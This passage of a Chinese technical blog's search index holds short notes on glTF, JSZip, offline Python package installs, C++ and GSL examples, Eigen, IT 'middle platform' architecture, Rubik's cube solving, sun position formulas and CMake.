‘ebook-convert,by 狼爷. 书籍配置文件(book.json),by wiliam.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[glTF2.0格式解析]]></title>
    <url>%2F2019%2F12%2F25%2Fgltf2-0%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[glTF（GL传输格式的衍生简称）是一种使用JSON标准的3D场景和模型的文件格式。 它是Khronos Group 3D格式工作组开发的一种与API无关的运行时资产交付格式。 它在HTML5DevConf 2016上宣布。此格式旨在成为一种高效，可互操作的格式，具有最小的文件大小和应用程序对运行时的处理。 因此，其创建者将其描述为“3D JPEG”。 glTF还为3D内容工具和服务定义了一种通用的发布格式。本文旨通过对glTF2.0格式的解析，进一步加深对3D建模的理解。 基本概念在对glTF2.0格式解析之前，应先了解一些3D建模或glTF独有的基本概念： scenes, nodes：场景的基本结构 cameras：场景的可视配置 meshes：构成3D对象的几何 buﬀers, buﬀerViews, accessors：数据参考和布局描述 materials：定义数据如何被渲染 textures, images, samplers：对象表面显示 skins：顶点蒙皮信息 animations：随时间改变的属性 图1 glTF概念之间的关系 参考链接 glTF,by KhronosGroup. glTF,by wikipedia. glTF Overview,by KhronosGroup. 骨骼蒙皮动画(SkinnedMesh)的原理解析,by feng. 【Unity3D】3D模型的使用——FBX的使用与Animation设置,by yongh701.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Cesium</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jszip使用方法简介]]></title>
    <url>%2F2019%2F12%2F24%2Fjszip%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[当大文件需要在网络中传输时，最好进行压缩传输，然后在终点进行解压。以ZIP压缩为例，压缩后文件大小极具减小，可节约带宽，提高系统并发能力。下面介绍使用jszip在浏览器端的解压方法。 JSZip简介JSZip是一个用于创建、读取和编辑.zip文件的javascript库，有一个可爱而简单的API。JSZip支持Nodejs和浏览器端的安装使用。具体方法如下： 1234567With npm : npm install jszipWith bower : bower install Stuk/jszipWith component : component install Stuk/jszipManually : download JSZip and include the file dist/jszip.js or dist/jszip.min.js 浏览器端解压zip文件后端Nodejs将zip文件以二进制形式存储到数据库中。当前端需要该zip文件时，后端将zip文件以二进制形式传输到前端，前端再解压还原。 Nodejs使用JSZip压缩文件123456789101112var JSZip = require(&quot;jszip&quot;);var zip = new JSZip();// create a filezip.file(&quot;hello.txt&quot;, &quot;Hello[p my)6cxsw2q&quot;);// oops, cat on keyboard. Fixing !zip.file(&quot;hello.txt&quot;, &quot;Hello World\n&quot;);// create a file and a folderzip.file(&quot;nested/hello.txt&quot;, &quot;Hello World\n&quot;);// same aszip.folder(&quot;nested&quot;).file(&quot;hello.txt&quot;, &quot;Hello World\n&quot;); 浏览器端解压Zip文件12345678910import JSZip from &apos;jszip&apos;let new_zip = new JSZip();// Read zip packagenew_zip.loadAsync(content).then(function(zip) &#123; // you now have every files contained in the loaded zip new_zip.file(&quot;hello.txt&quot;).async(&quot;string&quot;); &#125;); 参考链接 ZIP格式,by wikipedia. gzip,bzip2,zip三种格式压缩率对比,by CatDeacon. JSZip,by stuk.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python第三方包离线安装]]></title>
    <url>%2F2019%2F12%2F19%2FPython%E7%AC%AC%E4%B8%89%E6%96%B9%E5%8C%85%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[需要在离线的情况下，配置电脑的Python环境，具体方法如下： 寻找一台与离线电脑架构一致且能上网的干净电脑或虚拟机，在线配置Python环境。 在线电脑上打包Python环境，拷贝到离线电脑上。 在离线电脑上安装Python环境。 在线配置Python环境安装Python3之后，使用如下命令安装第三方包： 12# 临时使用清华镜像，加快Python第三方包下载速度pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple matplotlib 打包安装的Python第三方包： 123pip3 list #查看安装的包pip3 freeze &gt;requirements.txtpip3 install --download C:\Python37\packages -r requirements.txt 离线配置Python环境将打包好的Python环境拷贝到离线电脑后，使用如下命令安装第三方包： 1pip install --no-index --find-links=C:\Python37\packages -r requirements.txt 参考链接 pypi 镜像使用帮助,by 清华大学开源软件镜像站. Python pip离线安装package方法总结（以TensorFlow为例）,by 毛帅. 离线环境安装python第三方库,by 接纳自己.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++中Cout输出到文件]]></title>
    <url>%2F2019%2F12%2F12%2FCPlusPlus%E4%B8%ADCout%E8%BE%93%E5%87%BA%E5%88%B0%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[最近在调试一个C++程序时，没有报任何错误就直接退出了，Cout输出到控制台的信息没法查看，无法找到错误原因。于是想到将Cout输出重定向到文件，以便分析错误原因。具体代码如下： 12345678910111213141516171819#include &lt;iostream&gt;#include &lt;fstream&gt;using namespace std;int main()&#123; streambuf *psbuf,*backup; ofstream file; file.open(&quot;test.txt&quot;); backup=cout.rdbuf(); psbuf=file.rdbuf(); cout.rdbuf(psbuf);//将cout输出重定向到文件 cout&lt;&lt; &quot;This will write to test.txt!&quot;; cout.rdbuf(backup);//恢复cout输出重定向到终端 file.close(); return 0;&#125; 参考链接 NULL指针、零指针、野指针,by fly1988happy. C++ Null 指针,by w3cschool. How to redirect cin and cout to files?,by stackoverflow.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[红外点源目标探测仿真]]></title>
    <url>%2F2019%2F12%2F11%2F%E7%BA%A2%E5%A4%96%E7%82%B9%E6%BA%90%E7%9B%AE%E6%A0%87%E6%8E%A2%E6%B5%8B%E4%BB%BF%E7%9C%9F%2F</url>
    <content type="text"><![CDATA[红外点源目标探测仿真过程中遇到两个问题：一是哪些目标重合到一块，二是如何计算重合目标的中心和半径。这两个问题可分别通过计算图连通分量的算法和最小圆覆盖算法解决。 参考链接 最小圆覆盖（经典算法【三点定圆）,by CocoT. 利用邻接矩阵求解无向图的连通分支的个数,by EsonJohn. 使用向量叉乘判断线段是否相交并求交点,by leto. 图的那点事儿(1)-无向图,by SylvanasSun.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++矩阵的存储方法接出存储方法-行主序与列主序]]></title>
    <url>%2F2019%2F12%2F11%2FCPlusPlus%E7%9F%A9%E9%98%B5%E7%9A%84%E5%AD%98%E5%82%A8%E6%96%B9%E6%B3%95%E6%8E%A5%E5%87%BA%E5%AD%98%E5%82%A8%E6%96%B9%E6%B3%95-%E8%A1%8C%E4%B8%BB%E5%BA%8F%E4%B8%8E%E5%88%97%E4%B8%BB%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[最近要设计一个C++矩阵类，涉及到矩阵元素的存储。根据矩阵元素的存储，通常分为行主序和列主序。 行主序是指以行为优先单位，在内存中逐行存储； 列主序是指以列为优先单位，在内存中逐列存储。 行主序与列主序的代码实现有一定的惯例，表现如下： 行主序以二维数组存储，列主序以一维数组存储； 行主序以二维数组方式命名初始化参数，列主序以一维数组方式命名初始化参数； 行主序以行为单位初始化，列主序以列为单位初始化； 参考链接 OpenGL中矩阵的行主序与列主序,by 天律界中子.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GSL插值函数编译链接出错解决方法]]></title>
    <url>%2F2019%2F12%2F11%2FGSL%E6%8F%92%E5%80%BC%E5%87%BD%E6%95%B0%E7%BC%96%E8%AF%91%E9%93%BE%E6%8E%A5%E5%87%BA%E9%94%99%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[在Windows平台使用VS2017社区版将开源数学库GSL编译链接成DLL后，使用官方示例测试其插值函数。在编译链接该示例过程中报 LNK2001: unresolved external symbol _gsl_interp_cspline 的错误。 解决方法如下，在示例开始处定义如下宏即可。 define GSL_DLL 完整可运行示例如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243#define GSL_DLL#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;math.h&gt;#include &lt;gsl/gsl_errno.h&gt;#include &lt;gsl/gsl_spline.h&gt;intmain (void)&#123; int i; double xi, yi, x[10], y[10]; printf (&quot;#m=0,S=17\n&quot;); for (i = 0; i &lt; 10; i++) &#123; x[i] = i + 0.5 * sin (i); y[i] = i + cos (i * i); printf (&quot;%g %g\n&quot;, x[i], y[i]); &#125; printf (&quot;#m=1,S=0\n&quot;); &#123; gsl_interp_accel *acc = gsl_interp_accel_alloc (); gsl_spline *spline = gsl_spline_alloc (gsl_interp_cspline, 10); gsl_spline_init (spline, x, y, 10); for (xi = x[0]; xi &lt; x[9]; xi += 0.01) &#123; yi = gsl_spline_eval (spline, xi, acc); printf (&quot;%g %g\n&quot;, xi, yi); &#125; gsl_spline_free (spline); gsl_interp_accel_free (acc); &#125; return 0;&#125; 参考链接 Interpolation,by gsl homepage. [Help-gsl] LNK2001: unresolved external symbol _gsl_interp_cspline,by lists.gnu.org. [Help-gsl] Re: LNK2001: unresolved external symbol _gsl_interp_cspline,by lists.gnu.org.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[企事业单位IT架构的涅槃与重生之中台]]></title>
    <url>%2F2019%2F12%2F08%2F%E4%BC%81%E4%BA%8B%E4%B8%9A%E5%8D%95%E4%BD%8DIT%E6%9E%B6%E6%9E%84%E7%9A%84%E6%B6%85%E6%A7%83%E4%B8%8E%E9%87%8D%E7%94%9F%E4%B9%8B%E4%B8%AD%E5%8F%B0%2F</url>
    <content type="text"><![CDATA[近年来，企事业单位IT建设如火如荼，取得了很多的成果，极大地提高了企事业单位的工作效率。但同时企事业IT建设中存在的数据管理问题、业务管理问题不容忽视。在企事业单位IT建设的早期，项目之间没有整体规划，缺乏统一管理，造成数据孤岛、数据标准化缺失、数据存储杂乱、数据使用泛滥等数据管理问题，同时业务方面也存在重复建设、人亡政息、部门分割、多头管理等业务管理问题。中台架构即是针对上述问题，对企事业IT建设的涅槃和重生。 中台由来在传统企业IT架构中，通常分成前台和后台。前台即包括各种和用户直接交互的界面，比如web页面、手机app；也包括服务端各种实时响应用户请求的业务逻辑，比如商品查询、订单系统等等。而后台并不直接面向用户，而是面向运营人员的配置管理系统，比如商品管理、物流管理、结算管理。后台为前台提供了一些简单的配置。 在企业竞争不够激烈时，这种IT架构能够满足用户需求，虽然易造成数据冗余、数据孤岛、数据杂乱等问题。而今天随着互联网的蓬勃发展，企业竞争越来越激烈，用户也越来越挑剔。只有以用户为中心，快速影响用户的需求，不断迭代和试错，才能让企事业在竞争当中立于不败，才能更加满足用户的需求。于是中台架构应运而生。 中台架构本质上是对传统前后台IT架构的重构，尤其是后台的重构。在传统的IT架构中，通常会遇到如下两类问题： 一类是，许多业务需求或功能需求高度类似、通用化程度很高，但是由于没有专门的团队负责规划和开发，大量的系统重复开发、重复建设，导致复用性低、效率低、产研资源浪费、用户体验不统一。 另一类是，早期业务发展过程中，为了解决一些当下的业务问题，垂直的、个性化的业务逻辑与基础系统耦合太深，由于没有平台性质的规划，横向系统之间、上下游系统之间的交叉逻辑也非常多，这样导致在新业务、新市场的拓展过程中，系统没法直接复用，甚至没法快速迭代。 这两类问题，在软件开发领域，有专门的名称，叫做“重复造轮子”和“烟囱式架构”。中台的诞生即为了避免“重复造轮子”的尴尬和“烟囱式架构”的无序发展。 中台是真正为前台而生的平台（可以是技术平台，业务能力甚至是组织机构），它存在的唯一目的就是更好的服务前台规模化创新，进而更好的响应服务引领用户，使企业真正做到自身能力与用户需求的持续对接。 中台就像是在前台与后台之间添加的⼀组“变速⻮轮”，将前台与后台的速率进行匹配，是前台与后台的桥梁。它为前台而生，易于前台使用，将后台资源顺滑流向用户，响应用户。 中台价值中台的存在价值是为它的客户服务，比如业务中台和数据中台要快速响应前台应用的需求。中台建设的价值，在于帮助企业搭建更加适应企业数字化转型的全新IT架构。或者说，中台架构本身就是企业全新IT架构的核心内容和骨干系统，让企业IT运营更加顺畅，更能帮助企业尝试新的商业模式，完成战略转型的目的。 中台构建根据功能和角色的不同，中台可分为： 业务中台：通过各个项目的共通业务进行下沉，整合成通用的服务平台。 技术中台：为了避免研发人员重复发明轮子，向各个项目提供通用的底层框架、引擎、中间件。 数据中台：为各个项目进行各种数据采集和分析。 算法中台：为各个项目提供算法能力，比如推荐算法、搜索算法、图像识别、语音识别等等。 参考链接 漫画：什么是中台？,by 程序员小灰. 互联网公司中所谓中台是怎么定义的？,by zhihu. 白话中台战略：中台是个什么鬼?,by 王健. 中台战略全解读（一）：中台的发展与进化,by 陈新宇等.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[三阶魔方复原方法简介]]></title>
    <url>%2F2019%2F11%2F30%2F%E4%B8%89%E9%98%B6%E9%AD%94%E6%96%B9%E5%A4%8D%E5%8E%9F%E6%96%B9%E6%B3%95%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[魔方作为家喻户晓的益智玩具，由匈牙利建筑学教授暨雕塑家鲁比克·艾尔内于1974年发明，最初的名称叫Magic Cube[2]，1980年Ideal Toys公司于贩售此玩具，并将名称改为Rubik’s Cube。下面简要介绍魔方复原的方法。 魔方公式书写方式为了记录下复原、转乱的过程或公式的步骤，会用Singmaster符号来书写（由David Singmaster发明）。书写方式如下： R(Right)、L(Left)、U(Up)、D(Down)、F(Front)、B(Back)分别代表右、左、上、下、前、后层。 若是顺时针旋转，则直接写上符号；若是逆时针旋转，则在符号后加上“’”或是“i”；若是旋转180°，则在符号后加上“2”或是“²”。 魔方数学方程式变化数三阶魔方的总变化数是： {\displaystyle {\frac {8!\times 3^{8}\times 12!\times 2^{12}}{2\times 2\times 3}}=43,\!252,\!003,\!274,\!489,\!856,\!000\approx 4.33\times 10^{19}}三阶魔方总变化数的算式是这样得来： 8个角块可以互换位置（${\displaystyle 8!}$），也可以旋转（3），但不能单独旋转一个角块，所以总共有${\displaystyle {\frac {8!\times 3^{8}}{3}}}$种变化状态。 12个边块可以互换位置（$12!$)，也可以翻转（2），但不能单独翻转一个边块（将两个面对调），也不能单独交换两边块，所以总共有${\displaystyle {\frac {12!\times 2^{12}}{2\times 2}}}$种变化状态。 上帝的数字所有的三阶魔方都可以在有限步数内复原，1982年，佛雷与辛马斯特合著的《魔方手册》定义任意的三阶魔方都可以保证最少n步复原，并称呼n为上帝的数字。在此书中，证明上帝的数字介于17~52之间。 1995年，瑞德证明上帝的数字介于20-29之间。2006年，雷杜用群论证明上界可改进为27。 2007年，计算机科学家古柏曼与他的学生用20台超级电脑花了8000个小时证明上界可改进为26。 2008年，Tomas Rokicki宣布证明了任何魔方可以在25步以内解开[22]。之后又改进为22步。 2010年，包括Tomas Rokicki和Morley Davidson等人的研究团队证明任意组合的魔方可以在20步内还原，现在上帝的数字正式定为20。 魔方复原方法以白色面为例，说明魔方复原的简单方法。 第一步白色面的复原第一步白色面的复原非常简单，分成两小步，如图1和图2所示。 图1 解决白色边缘 图2 解决白色角落 白色面的还原比较简单，就不介绍具体步骤了。 第二步中间层的复原第二步中间层的复原分成两种情况，如图3和图4所示。 U' L' U L U F U' F' 图3 中间层左侧边块的复原 U R U' R' U' F' U F 图4 中间层右侧边块的复原 第三步顶层的复原第三步最后一层的还原遇到的情况很多，目前我也没有完全搞明白，下面简单介绍最后一层复原的步骤，但并不能保证一定能复原。 形成顶层十字 F R U R' U' F' 图5 顶层十字的复原 根据顶层状态，多次使用公式F R U R’ U’ F’，以形成顶部十字。 交换顶层十字边块交换顶层边块，使其边缘颜色保持一致，如图6所示。 R U R' U R U2 R' U 图6 交换顶层边块 交换顶层角块现在只剩下黄色的角落，将分两个步骤进行。首先，我们必须以定位它们，在下一步骤中定向它们。 定位顶层角块 U R U' L' U R' U' L 图7 定位顶层角块 此算法循环上面图像上顶层的角块，但标有“OK”的前右上角将保留在原位。 定向顶层角块现在顶层角块都已定位，但角块颜色与周围面不一致，使用如图8所示算法一个一个旋转顶层角块。 R' D' R D 图8 定向顶层角块 首先在突出显示的右前方点，拿着你的手有一个不对准的黄色角落的立方体（见图8）。重复R’ D’ R D算法，直到这一块在它的地方与黄色贴纸。 只将一面向上转动，将另一个错误的黄色拐角移到突出显示的点，并重复R’ D’ R D算法，直到这个黄色面被解决。 移动其他未对齐的黄色边角，一个一个到标记的点，并做公式，直到所有的黄色角落都被解决。 顶层最后两个角块位置对颜色不对的复原方法将色向不对的两个角放在顶层左手边位置,用公式(R;U;R’;U;R;U2;R’;)(L’;U’;L;U’;L’;U2;L;)。 做一遍如果不对的话,就再做一遍就行了. 参考链接 如何解决魔方 魔方,by cub3x3. 三阶魔方解法最后两个角如何复原?位置是对的只是颜色对不住？,by qiuyuhanfeng. 魔方,by wikipedia. 暴强！！！只需7步，任何魔方6面皆可还原！,by 飞天飘渺.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>游戏</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Eigen入门教程]]></title>
    <url>%2F2019%2F11%2F27%2FEigen%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[Eigen是用于线性代数的C ++模板库，包括矩阵，向量，数值求解器和相关算法。 安装从Eigen官网下载最新的Eigen版本。解压Eigen，然后使用Cmake进行配置并生成Visual Studio 15 2017的工程。打开解决方案，先生成ALL_BUILD工程，再生成INSTALL工程，则安装Eigen完毕。将在安装路径下生成Eigen的头文件。 当然也可以不编译安装，直接将Eigen源代码目录下的Eigen子目录复制到Include文件夹即可。 示例运行时推断矩阵尺寸示例12345678910111213#include &lt;iostream&gt;#include &lt;Eigen/Dense&gt;using namespace Eigen;using namespace std;int main()&#123; MatrixXd m = MatrixXd::Random(3,3); m = (m + MatrixXd::Constant(3,3,1.2)) * 50; cout &lt;&lt; &quot;m =&quot; &lt;&lt; endl &lt;&lt; m &lt;&lt; endl; VectorXd v(3); v &lt;&lt; 1, 2, 3; cout &lt;&lt; &quot;m * v =&quot; &lt;&lt; endl &lt;&lt; m * v &lt;&lt; endl;&#125; 编译时确定矩阵尺寸示例1234567891011121314 #include &lt;iostream&gt;#include &lt;Eigen/Dense&gt;using namespace Eigen;using namespace std;int main()&#123; Matrix3d m = Matrix3d::Random(); m = (m + Matrix3d::Constant(1.2)) * 50; cout &lt;&lt; &quot;m =&quot; &lt;&lt; endl &lt;&lt; m &lt;&lt; endl; Vector3d v(1,2,3); cout &lt;&lt; &quot;m * v =&quot; &lt;&lt; endl &lt;&lt; m * v &lt;&lt; endl;&#125; 参考链接 Getting started,by eigen home.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[太阳位置及辐射强度等属性的计算方法]]></title>
    <url>%2F2019%2F11%2F26%2F%E5%A4%AA%E9%98%B3%E4%BD%8D%E7%BD%AE%E5%8F%8A%E8%BE%90%E5%B0%84%E5%BC%BA%E5%BA%A6%E7%AD%89%E5%B1%9E%E6%80%A7%E7%9A%84%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[太阳位置是从地球表面观察时，太阳在天空中的位置，它是时间和地理位置两者的函数。计算给定地点和时间的太阳位置要经过下列三个步骤： 计算太阳在黄道坐标系的位置 转换到赤道坐标系统 依据观测者的位置和时间，转换到地平坐标系 计算太阳黄道坐标的方法黄道坐标系是以黄道作基准平面的天球坐标系统，多用作研究太阳系天体运动情况之用。如图1所示。 图1 黄道坐标系 黄道是由地球上观察太阳一年中在天球上的视运动所通过的路径，若以地球“不动”作参照的话就是太阳绕地球公转的轨道平面（黄道面）在天球上的投影。 黄道与天赤道相交于两点：春分点与秋分点（这两点称二分点）；而黄道对应的两个几何极是北黄极（在天龙座）、与南黄极 (在剑鱼座)。 在黄道上与黄道平行的小圆称黄纬，符号β，以由黄道面向北黄极方向为正值（0°至90°），向南黄极方向则为负值。垂直黄道的经度称黄经，符号为λ，由春分点起由西向东量度（0°至360°）。像赤道坐标系中的赤经一样，以春分点做为黄经的起点。 此坐标系特别适合标示太阳系内天体的位置，大多数行星（水星和冥王星除外）与许多小行星轨道平面与黄道的倾角都很小，故其黄纬值（β）都不大。 太阳黄道坐标的近似计算方法如下： 先计算与格林尼治 2000.0年1月1日中午12:00（历元）相距的日数。如果你知道儒略日，则你的叙述会如下： n = \mathrm{JD} - 2451545.0以光行差修正太阳的平黄经，如下： L = 280.460^\circ + 0.9856474^\circ n太阳的平近点角（实际上，是地球在轨道上绕着太阳，但是假设太阳绕着地球比较方便）如下： g = 357.528^\circ + 0.9856003^\circ n根据需要将L和g多次加或减360°，让数值的范围调整到0°至 360°之间。 最后，太阳的黄经是： \lambda = L + 1.915^\circ \sin g + 0.020^\circ \sin 2g太阳的黄纬是: \beta = 0太阳的黄纬不超过0.00033， 并且从太阳到地球的距离，以天文单位度量是： R = 1.00014 - 0.01671 \cos g - 0.00014 \cos 2g计算太阳赤道坐标的方法赤道坐标系统是使用得最广泛的天球坐标系统，他的元素是: 赤纬（$\delta$） 赤经（$\alpha$ ）－也记为RA 他与地理坐标系统非常相似，因为两者使用相同的基准平面和相同的极点。地球的赤道在天球上的投影就称为天球赤道，相同的，地理极点在天球上的投影就是天极，如图2所示。 图2 赤道坐标系 在经过一夜或数个夜晚，就能看出来星星在天空中的位置移动了，当然，这并非恒星在天球上的运动，只是地球运动造成的。因为岁差和章动的影响，在相当长的时间间隔下所做的观测，就必须注明所使用的特殊历元，为行星、恒星、星系等等的位置做记录。现在使用的历元是J2000.0分点，稍早期使用的是B1950.0分点。 赤道坐标系统中与纬度相似的值是赤纬(缩写为Dec.)，是天体在天球赤道上方或下方的角度。与经度对应的是赤经(缩写为RA)，是与春分点的角度距离，不同于经度的是赤经以时、分、秒为单位，而非度、分、秒。 $\lambda$、$\beta$ 和 $R$ 构成太阳在黄道座标完整的位置。通过黄赤交角 $ε$ 的计算可以转换成赤道座标，计算方法如下： 赤经： \alpha = \arctan(\cos \epsilon \tan \lambda)赤纬： \delta = \arcsin(\sin \epsilon \sin \lambda)其中，黄赤交角不是固定不变的，它目前的值接近： \epsilon = 23.439^\circ - 0.0000004^\circ n计算太阳地平坐标的方法地平坐标系，又作地平座标系，是天球坐标系统中的一种，以观测者所在地为中心点，所在地的地平线作为基础平面，将天球适当的分成能看见的上半球和看不见（被地球本身遮蔽）的下半球。上半球的顶点（最高点）称为天顶，下半球的顶点（最低点）称为地底。如图3所示。 图3 地平坐标系 地平坐标系统是： 高度角（Altitude, Alt）或仰角又称地平纬度，是天体和观测者所在地的地平线的夹角，有时就称为高度或海拔标高（elevation, geometric height）。 方位角（Azimuth, Az）又称地平经度，是沿着地平线测量的角度（由正北方为起点向东方测量）。 因此地平坐标系有时也被称为高度/方位（Alt/Az）坐标系统。 只要知道观测者的地理坐标与时间，就可以将地平坐标转换成赤道坐标，或是反过来将赤道坐标转换成地平坐标。（纬度在北极点是+90°，在赤道是0°，南极点是-90°。） 在数学公式中，以$A$代表方位，$a$代表高度。 以$\delta$ 表示赤纬，$H$ 表示时角。 $φ$ 为观测者所在地的纬度。 赤道坐标转为地平坐标的计算方法如下： \sin a=\sin \phi \cdot \sin \delta +\cos \phi \cdot \cos \delta \cdot \cos H{\displaystyle \cos A\cdot \cos a=-\cos \phi \cdot \sin \delta +\sin \phi \cdot \cos \delta \cdot \cos H}{\displaystyle \sin A\cdot \cos a=\cos \delta \cdot \sin H}有些人或许会试图将最后两个公式相除来加以简化，以消除$\cos a$，而只剩下$\tan A$。但是正切函数不能清楚的区别出象限，例如45°和225°是完全不同的方位，分别指向相对的东北方和西南方。 时角（HA）是天文学的名词，一个天体的时角被定义为该天体的赤经与当地的恒星时的差值。 在天文学和天文航海中，时角是在赤道坐标系中用于给出天球上点的方向的坐标之一。 一个点的时角是两个平面之间的角度：一个平面包含地轴和天顶（子午面），另一个平面是穿过该点与极点（地轴）的球面大圆切圆所形成的平面（赤经圈）。如图4所示。 图3 时角 时角由天赤道平面上的橙色箭头指示。 箭头自天球天赤道的子午面至观测目标所在面的球面大圆处结束，该球面大圆也是赤经圈时角由子午线确定，遵循的规则是在子午线的东边则为负时角，在子午线的西边则为正时角，或者向西为正的360度，时角与经度的换算方法为24h = 360°。 一个天体的时角表示该天体是否通过了当地的子午圈（中天）。其数值则表示了该天体与当地子午圈的角距离，并借用时间的单位，以小时来计量（1HA = 15度）。例如，一个天体的时角是2.5HA，就表示他已经在2.5个小时之前通过当地的子午圈，并且在当地子午圈的西方37.5度的距离上。负数则表示在多少小时之后将通过当地的子午圈。当然，当时角为0时的意思就是这个天体就在当地的子午圈上。 参考链接 太阳位置,by wikipedia. 儒略日,by wikipedia. 黄道坐标系,by wikipedia. 赤道坐标系统,by wikipedia. 地平坐标系,by wikipedia. 时角,by wikipedia.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经纬高与北天东坐标之间的转换方法]]></title>
    <url>%2F2019%2F11%2F16%2F%E7%BB%8F%E7%BA%AC%E9%AB%98%E4%B8%8E%E5%8C%97%E5%A4%A9%E4%B8%9C%E5%9D%90%E6%A0%87%E4%B9%8B%E9%97%B4%E7%9A%84%E8%BD%AC%E6%8D%A2%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[经纬高是地理坐标系的表示方法，北天东则是一种直角坐标系。它们之间通过直角坐标系原点的经纬度联系起来，并可相互转换。下面介绍它们之间的转换方法。 坐标系分类目前常用的坐标系统分成两种：地理坐标系和直角坐标系。下面分别介绍这两种坐标系。 地理坐标系地理坐标系一般是指由经度、纬度和相对高度组成的坐标系，能够标示地球上的任何一个位置。经度和纬度常合称为经纬度，把球面上的经纬度显示在平面地图上需要采用某种地图投影。 地理坐标系的用途很广泛，例如天文学上常用的黄道坐标系、赤道坐标系同样也是一种地理坐标系。 直角坐标系笛卡尔坐标系（英语：Cartesian coordinate system，也称直角坐标系）在数学中是一种正交坐标系，由法国数学家勒内·笛卡尔引入而有此名。 二维的直角坐标系通常由两个互相垂直的坐标轴设定，通常分别称为x-轴和 y-轴；两个坐标轴的相交点，称为原点，通常标记为O，既有“零”的意思，又是英语“Origin”的首字母。每一个轴都指向一个特定的方向。这两个不同线的坐标轴，决定了一个平面，称为xy-平面，又称为笛卡尔平面。通常两个坐标轴只要互相垂直，其指向何方对于分析问题是没有影响的，但习惯性地，x-轴被水平摆放，称为横轴，通常指向右方；y-轴被竖直摆放而称为纵轴，通常指向上方。两个坐标轴这样的位置关系，称为二维的右手坐标系，或右手系。 直角坐标系也可以推广至三维空间与高维空间 (higher dimension)。在原本的二维直角坐标系，再添加一个垂直于x-轴，y-轴的坐标轴，称为z-轴。假若，这三个坐标轴满足右手定则，则可得到三维的直角坐标系。这z-轴与x-轴，y-轴相互正交于原点。在三维空间的任何一点P，可以用直角坐标${\displaystyle (x,\ y,\ z)}$来表达其位置。 直角坐标系的用途非常广泛。例如天文学上常用的赤道直角坐标系、地平坐标系是一种直角坐标系。地心地固坐标系、北天东坐标系、北东地坐标系都是一种直角坐标系。 转换方法经纬高与北天东的转换方法，通常通过地心地固坐标系作为中介进行转换。例如，经纬高转北天东，首先将经纬高转地心地固坐标系，再将地心地固坐标系转北天东坐标系。北天东转经纬高亦如此。 经纬高转地心地固坐标系地心地固坐标系的示意图如图1所示。 图1 地心地固坐标系 地心地固坐标系转北天东参考链接 地心地固坐标系,by wikipedia. 地球椭球,by wikipedia. 椭球体的重要参数和公式,by 一灯. how do I translate of lon/lat coordinate by some N-E meters distance on earth surface?,by stackoverflow. 笛卡尔坐标系,by wikipedia. 地理坐标系,by wikipedia. ECEF坐标系,by 深_蓝.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CMake使用入门教程]]></title>
    <url>%2F2019%2F11%2F16%2FCMake%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[近几年美国对中国的科技封杀十分严重，说不定哪天Windows操作系统就不让我们用了。因此，在构建C/C++项目时应考虑跨平台，哪天不让用Windows了，可以请容易的将项目移植到Linux上。不同系统平台有不同的C/C++编译器，不同编译器有不同的构建规则，针对每个平台的不同编译器编写构建规则十分复杂，幸好有CMake可简化构建规则的编写，实现一次编写，不同平台适用。下面简单介绍CMake的使用。 CMake简介代码变成可执行文件，叫做编译（compile）；先编译这个，还是先编译那个（即编译的安排），叫做构建（build）。 Make是最常用的构建工具，诞生于1977年，主要用于C语言的项目。但是实际上 ，任何只要某个文件有变化，就要重新构建的项目，都可以用Make构建。 Make工具有很多，例如 GNU Make ，QT 的 qmake ，微软的 MS nmake，BSD Make（pmake），Makepp，等等。这些 Make 工具遵循着不同的规范和标准，所执行的 Makefile 格式也千差万别。这样就带来了一个严峻的问题：如果软件想跨平台，必须要保证能够在不同平台编译。而如果使用上面的 Make 工具，就得为每一种标准写一次 Makefile ，这将是一件让人抓狂的工作。 CMake就是针对上面问题所设计的工具：它首先允许开发者编写一种平台无关的 CMakeList.txt 